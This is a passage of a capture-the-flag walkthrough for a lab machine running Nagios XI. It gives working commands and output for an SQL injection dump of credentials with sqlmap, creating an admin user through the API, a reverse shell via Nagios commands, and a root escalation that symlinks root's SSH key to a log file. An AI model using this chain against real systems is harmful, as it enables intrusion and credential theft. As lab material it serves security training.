+</code></pre>
+
+<p>But authenticate seems to be the thing we are just looking for:</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
+{"error":"You can only use POST with authenticate."}
+❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
+{"error":"Must be valid username and password."}
+❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=svc&amp;password=XjH7VCehowpR1xZB' -k
+{"username":"svc","user_id":"2","auth_token":"ef77d3c4604b0bad112b25626238b2902de1d2fa","valid_min":5,"valid_until":"Sat, 11 May 2024 15:19:13 -0400"}
+</code></pre>
+
+<p>This <a href="https://support.nagios.com/forum/viewtopic.php?t=58783">article</a> gives us an idea of how to use this token to login, he uses it in the ?token parameter of a php file. With that information, we can suppose that it also works for login.php:</p>
+
+<p><img src="/assets/images/Monitored/access_to_nagiosxi_panel.png" alt="Access to Nagios XI panel" /></p>
+
+<p>Looking for <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-1424/product_id-26507/Nagios-Nagios-Xi.html">vulnerabilities</a> of Nagios XI, we can see two that are classified so dangerous with the CVSS score 9.8 (more info of CVSS <a href="https://www.threatdown.com/blog/how-cvss-works-characterizing-and-scoring-vulnerabilities/">here</a>):</p>
+
+<p><img src="/assets/images/Monitored/nagiosxi_vulns.png" alt="Nagios XI vulns" /></p>
+
+<p>There is a SQL injection and a RCE for the version 5.11.3 and we are with a earlier version (5.11.0):</p>
+
+<p><img src="/assets/images/Monitored/nagios_version.png" alt="Nagios version" /></p>
+
+<p>Let’s go for the SQL injection as it is described <a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/">here</a>. We can confirm it adding a ‘:</p>
+
+<p><img src="/assets/images/Monitored/sqli.png" alt="SQLi" /></p>
+
+<p>Let’s use sqlmap to enumerate databases:</p>
+
+<pre><code class="language-bash">❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&amp;id=3' -p id --dbs --dbms="MySQL" --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.2#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:36:44 /2024-05-11/
+
+[22:36:44] [INFO] testing connection to the target URL
+[22:36:45] [INFO] testing if the target URL content is stable
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[22:36:46] [INFO] target URL content is stable
+
+[..SNIP..]
+
+POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: action=acknowledge_banner_message&amp;id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=acknowledge_banner_message&amp;id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=acknowledge_banner_message&amp;id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
+---
+[22:38:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.56
+back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+[22:38:38] [INFO] fetching database names
+[22:38:38] [INFO] retrieved: 'information_schema'
+[22:38:39] [INFO] retrieved: 'nagiosxi'
+available databases [2]:
+[*] information_schema
+[*] nagiosxi
+
+[22:38:39] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'
+
+[*] ending @ 22:38:39 /2024-05-11/
+</code></pre>
+
+<p>We have the interesting database nagiosxi, as it says in the article above, the interesting tables are xi_users and xi_session so I will start retrieving the columns of xi_users:</p>
+
+<pre><code class="language-bash">❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&amp;id=3' -p id -D nagiosxi -T xi_users --columns --dbms="MySQL"  --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:41:56 /2024-05-11/
+
+[22:41:56] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: action=acknowledge_banner_message&amp;id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=acknowledge_banner_message&amp;id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=acknowledge_banner_message&amp;id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
+---
+[22:41:57] [INFO] testing MySQL
+[22:41:57] [INFO] confirming MySQL
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[22:41:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.56
+back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+[22:41:57] [INFO] fetching columns for table 'xi_users' in database 'nagiosxi'
+[22:41:57] [INFO] resumed: 'user_id'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'username'
+[22:41:57] [INFO] resumed: 'varchar(255)'
+[22:41:57] [INFO] resumed: 'password'
+[22:41:57] [INFO] resumed: 'varchar(128)'
+[22:41:57] [INFO] resumed: 'name'
+[22:41:57] [INFO] resumed: 'varchar(100)'
+[22:41:57] [INFO] resumed: 'email'
+[22:41:57] [INFO] resumed: 'varchar(128)'
+[22:41:57] [INFO] resumed: 'backend_ticket'
+[22:41:57] [INFO] resumed: 'varchar(128)'
+[22:41:57] [INFO] resumed: 'enabled'
+[22:41:57] [INFO] resumed: 'smallint(6)'
+[22:41:57] [INFO] resumed: 'api_key'
+[22:41:57] [INFO] resumed: 'varchar(128)'
+[22:41:57] [INFO] resumed: 'api_enabled'
+[22:41:57] [INFO] resumed: 'smallint(6)'
+[22:41:57] [INFO] resumed: 'login_attempts'
+[22:41:57] [INFO] resumed: 'smallint(6)'
+[22:41:57] [INFO] resumed: 'last_attempt'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'last_password_change'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'last_login'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'last_edited'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'last_edited_by'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'created_by'
+[22:41:57] [INFO] resumed: 'int(11)'
+[22:41:57] [INFO] resumed: 'created_time'
+[22:41:57] [INFO] resumed: 'int(11)'
+Database: nagiosxi
+Table: xi_users
+[17 columns]
++----------------------+--------------+
+| Column               | Type         |
++----------------------+--------------+
+| name                 | varchar(100) |
+| api_enabled          | smallint(6)  |
+| api_key              | varchar(128) |
+| backend_ticket       | varchar(128) |
+| created_by           | int(11)      |
+| created_time         | int(11)      |
+| email                | varchar(128) |
+| enabled              | smallint(6)  |
+| last_attempt         | int(11)      |
+| last_edited          | int(11)      |
+| last_edited_by       | int(11)      |
+| last_login           | int(11)      |
+| last_password_change | int(11)      |
+| login_attempts       | smallint(6)  |
+| password             | varchar(128) |
+| user_id              | int(11)      |
+| username             | varchar(255) |
++----------------------+--------------+
+
+[22:41:57] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'
+
+[*] ending @ 22:41:57 /2024-05-11/
+</code></pre>
+
+<p>We have the interesting columns api_key, username and password, so let’s retrieve them:</p>
+
+<pre><code class="language-bash">❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&amp;id=3' -p id -D nagiosxi -T xi_users -C username,password,api_key --dump --dbms="MySQL"  --batch
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:45:42 /2024-05-11/
+
+[22:45:42] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: action=acknowledge_banner_message&amp;id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=acknowledge_banner_message&amp;id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=acknowledge_banner_message&amp;id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
+---
+[22:45:43] [INFO] testing MySQL
+[22:45:43] [INFO] confirming MySQL
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[22:45:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.56
+back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+[22:45:43] [INFO] fetching entries of column(s) 'api_key,password,username' for table 'xi_users' in database 'nagiosxi'
+[22:45:44] [INFO] retrieved: '2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK'
+[22:45:44] [INFO] retrieved: '$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK'
+[22:45:45] [INFO] retrieved: 'svc'
+[22:45:45] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
+[22:45:46] [INFO] retrieved: '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C'
+[22:45:46] [INFO] retrieved: 'nagiosadmin'
+Database: nagiosxi
+Table: xi_users
+[2 entries]
++-------------+--------------------------------------------------------------+------------------------------------------------------------------+
+| username    | password                                                     | api_key                                                          |
++-------------+--------------------------------------------------------------+------------------------------------------------------------------+
+| svc         | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK |
+| nagiosadmin | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL |
++-------------+--------------------------------------------------------------+------------------------------------------------------------------+
+
+[22:45:46] [INFO] table 'nagiosxi.xi_users' dumped to CSV file '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv'
+[22:45:46] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'
+
+[*] ending @ 22:45:46 /2024-05-11/
+</code></pre>
+
+<p>The passwords are not crackable but we have the nagiosadmin api_key, let’s fuzz for other api endpoints with this new api token with the apikey parameter (as showed in the <a href="https://support.nagios.com/kb/category.php?id=105">video</a> from the nagios xi api documentation) and a special dictionary for api endpoints:</p>
+
+<pre><code class="language-bash">❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/api/v1 --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -k -w /opt/SecLists/Discovery/Web-Content/api/objects.txt
+                                                                                                                                                                                        
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api/v1
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/api/objects.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🤔  Query Parameter       │ apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        1l        3w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/api/v1?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+404      GET        9l       31w      283c https://nagios.monitored.htb/nagiosxi/api/nagiosxi/api/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+301      GET        9l       28w      412c https://nagios.monitored.htb/nagiosxi/api/v1?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL =&gt; https://nagios.monitored.htb/nagiosxi/api/v1/?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        4w       32c https://nagios.monitored.htb/nagiosxi/api/v1/0?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/config?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+404      GET        1l        4w       24c https://nagios.monitored.htb/nagiosxi/api/v1/lost%2Bfound?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/objects?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/User?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+[####################] - 3m      3136/3136    0s      found:12      errors:156    
+[####################] - 3m      3133/3133    21/s    https://nagios.monitored.htb/nagiosxi/api/v1/ 
+</code></pre>
+    
+      <h1 id="access-as-nagios">
+        
+        
+          Access as nagios <a href="#access-as-nagios" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Searching for vulnerabilities for this api endpoints, we can use /system/user endpoint to <a href="https://www.exploit-db.com/exploits/44560">add a new user</a> with admin privileges and chain it to the tipical nagios xi authenticated rce in the commands section:</p>
+
+<pre><code class="language-bash">❯ curl -s -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=test&amp;password=test&amp;name=test&amp;email=test%40test.com&amp;auth_level=admin&amp;force_pw_change=0' -k
+{"success":"User account test was added successfully!","user_id":6}
+</code></pre>
+
+<p>Now we can login with this user, accept the license agreement and go into Configure &gt; Core config manager &gt; Commands:</p>
+
+<p><img src="/assets/images/Monitored/nagiosxi_commands.png" alt="Nagios XI commands" /></p>
+
+<p>And add a new command to give you a reverse shell:</p>
+
+<p><img src="/assets/images/Monitored/execute_command.png" alt="Add command" /></p>
+
+<p>Now, in the menu Monitoring go to Hosts &gt; localhost, select your command, and click on check command:</p>
+
+<p><img src="/assets/images/Monitored/run_command.png" alt="Run command" /></p>
+
+<p>Now we receive the shell:</p>
+
+<p><img src="/assets/images/Monitored/shell_received.png" alt="Shell received" /></p>
+
+<p>Now, stabilize the tty with this commands:</p>
+
+<pre><code class="language-bash">nagios@monitored:~$ script /dev/null -c bash  
+script script /dev/null -c bash
+Script started, output log file is 'script'.
+nagios@monitored:~$ ^Z
+[1]  + 668926 suspended  nc -lvnp 443
+❯ stty raw -echo;fg
+[1]  + 668926 continued  nc -lvnp 443
+                                     reset xterm
+nagios@monitored:~$ export TERM=xterm
+nagios@monitored:~$ export SHELL=bash
+nagios@monitored:~$ stty rows &lt;your rows&gt; columns &lt;your columns&gt;
+</code></pre>
+
+<ul>
+  <li><code>script /dev/null -c bash</code>: Spawns a tty.</li>
+  <li><code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
+  <li><code>stty raw -echo;fg</code>: give us the shell back again.</li>
+  <li><code>reset xterm</code>: resets the terminal to give us the bash console.</li>
+  <li><code>export TERM=xterm</code>: let us do ctrl+l to clean the terminal.</li>
+  <li><code>export SHELL=bash</code>: specifies the system that we are using a bash console.</li>
+  <li><code>stty rows &lt;YOUR ROWS&gt; columns &lt;YOUR COLUMNS&gt;</code>: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you can view it with <code>stty size</code> in a complete new window).</li>
+</ul>
+    
+      <h1 id="privilege-escalation-to-root">
+        
+        
+          Privilege escalation to root <a href="#privilege-escalation-to-root" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>If we look at sudo -l, we can run a lot of commands:</p>
+
+<pre><code class="language-bash">nagios@monitored:~$ sudo -l
+Matching Defaults entries for nagios on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+</code></pre>
+
+<p>Let’s analyze the getprofile.sh script.
+First, it gets a parameter for a folder and verifies that all the characters are alphanumeric:</p>
+
+<pre><code class="language-bash"># GRAB THE ID
+folder=$1
+if [ "$folder" == "" ]; then
+    echo "You must enter a folder name/id to generate a profile."
+    echo "Example: ./getprofile.sh &lt;id&gt;"
+    exit 1
+fi
+</code></pre>
+
+<p>Then, it takes the content of a lot of files with tail and saves it into /usr/local/nagiosxi/var/components/profile/$folder/logs/{file}:</p>
+
+<pre><code class="language-bash">echo "Creating nagios.txt..."
+nagios_log_file=$(cat /usr/local/nagios/etc/nagios.cfg | sed -n -e 's/^log_file=//p' | sed 's/\r$//')
+tail -n500 "$nagios_log_file" &amp;&gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/nagios.txt"
+
+echo "Creating perfdata.txt..."
+perfdata_log_file=$(cat /usr/local/nagios/etc/pnp/process_perfdata.cfg | sed -n -e 's/^LOG_FILE = //p')
+tail -n500 "$perfdata_log_file" &amp;&gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdata.txt"
+
+echo "Creating npcd.txt..."
+npcd_log_file=$(cat /usr/local/nagios/etc/pnp/npcd.cfg | sed -n -e 's/^log_file = //p')
+tail -n500 "$npcd_log_file" &amp;&gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/npcd.txt"
+
+echo "Creating cmdsubsys.txt..."
+tail -n500 /usr/local/nagiosxi/var/cmdsubsys.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/cmdsubsys.txt"
+
+echo "Creating event_handler.txt..."
+tail -n500 /usr/local/nagiosxi/var/event_handler.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/event_handler.txt"
+
+echo "Creating eventman.txt..."
+tail -n500 /usr/local/nagiosxi/var/eventman.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/eventman.txt"
+
+echo "Creating perfdataproc.txt..."
+tail -n500 /usr/local/nagiosxi/var/perfdataproc.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/perfdataproc.txt"
+
+echo "Creating sysstat.txt..."
+tail -n500 /usr/local/nagiosxi/var/sysstat.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/nagios-logs/sysstat.txt"
+
+echo "Creating systemlog.txt..."
+if [ -f /var/log/messages ]; then
+    /usr/bin/tail -n1000 /var/log/messages &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
+elif [ -f /var/log/syslog ]; then
+    /usr/bin/tail -n1000 /var/log/syslog &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/messages.txt"
+fi
+
+echo "Retrieving all snmp logs..."
+if [ -f /var/log/snmptrapd.log ]; then
+    /usr/bin/tail -n1000 /var/log/snmptrapd.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptrapd.txt"
+fi
+if [ -f /var/log/snmptt/snmptt.log ]; then
+    /usr/bin/tail -n1000 /var/log/snmptt/snmptt.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmptt.txt"
+fi
+if [ -f /var/log/snmptt/snmpttsystem.log ]; then
+    /usr/bin/tail -n1000 /var/log/snmptt/snmpttsystem.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttsystem.txt"
+fi
+if [ -f /var/log/snmpttunknown.log ]; then
+    /usr/bin/tail -n1000 /var/log/snmpttunknown.log &gt; "/usr/local/nagiosxi/var/components/profile/$folder/logs/snmpttunknown.log.txt"
+fi
+
+</code></pre>
+
+<p>And backup them into the folder:</p>
+
+<pre><code class="language-bash">## temporarily change to that directory, zip, then leave
+(
+    ts=$(date +%s)
+    cd /usr/local/nagiosxi/var/components/profile
+    mv "$folder" "profile-$ts"
+    zip -r profile.zip "profile-$ts"
+    rm -rf "profile-$ts"
+    mv -f profile.zip ../
+)
+</code></pre>
+
+<p>The problem here is that the file phpmailer.log is writable by the user nagios and we can link it to /root/.ssh/id_rsa to exploit this vulnerability by following this steps:</p>
+
+<p>Link the id_rsa file to phpmailer.log:</p>
+
+<pre><code>nagios@monitored:~$ ls -l /usr/local/nagiosxi/tmp/phpmailer.log
+-rw-r--r-- 1 nagios nagios 0 Nov 10  2023 /usr/local/nagiosxi/tmp/phpmailer.log
+nagios@monitored:~$ ln -s -f /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log 
+nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
+mv: cannot stat '/usr/local/nagiosxi/tmp/profile-1.html': No such file or directory
+-------------------Fetching Information-------------------
+Please wait.......
+Creating system information...
+Creating nagios.txt...
+Creating perfdata.txt...
+Creating npcd.txt...
+Creating cmdsubsys.txt...
+Creating event_handler.txt...
+Creating eventman.txt...
+Creating perfdataproc.txt...
+Creating sysstat.txt...
+Creating systemlog.txt...
+Retrieving all snmp logs...
+Creating apacheerrors.txt...
+Creating mysqllog.txt...
+Getting xi_users...
+Getting xi_usermeta...
+Getting xi_options(mail)...
+Getting xi_otions(smtp)...
+Creating a sanatized copy of config.inc.php...
+Creating memorybyprocess.txt...
+Creating filesystem.txt...
+Dumping PS - AEF to psaef.txt...
+Creating top log...
+Creating sar log...
+Copying objects.cache...
+Copying MRTG Configs...
+tar: Removing leading `/' from member names
+Counting Performance Data Files...
+Counting MRTG Files...
+Getting Network Information...
+Getting CPU info...
+Getting memory info...
+Getting ipcs Information...
+Getting SSH terminal / shellinabox yum info...
+Getting Nagios Core version...
+Getting NPCD version...
+Getting NRPE version...
+Getting NSCA version...
+Getting NagVis version...
+Getting WKTMLTOPDF version...
+Getting Nagios-Plugins version...
+Getting BPI configs...
+Getting Firewall information...
+Getting maillog...
+tail: cannot open '/var/log/maillog' for reading: No such file or directory
+Getting phpmailer.log...
+Getting nom data...
+ls: cannot access '/usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.txt': No such file or directory
+ls: cannot access '/usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.tar.gz': No such file or directory
+cp: cannot stat '': No such file or directory
+cp: cannot stat '': No such file or directory
+Zipping logs directory...
+  adding: profile-1715465825/ (stored 0%)
+  adding: profile-1715465825/config.inc.php (deflated 70%)
+  adding: profile-1715465825/xi_usermeta.txt (deflated 97%)
+  adding: profile-1715465825/iptables.txt (deflated 36%)
+  adding: profile-1715465825/top.txt (deflated 83%)
+  adding: profile-1715465825/ip_addr.txt (deflated 57%)
+  adding: profile-1715465825/filesystem.txt (deflated 56%)
+  adding: profile-1715465825/ipcs.txt (deflated 58%)
+  adding: profile-1715465825/mrtg.tar.gz (stored 0%)
+  adding: profile-1715465825/nagios-logs/ (stored 0%)
+  adding: profile-1715465825/nagios-logs/event_handler.txt (deflated 98%)
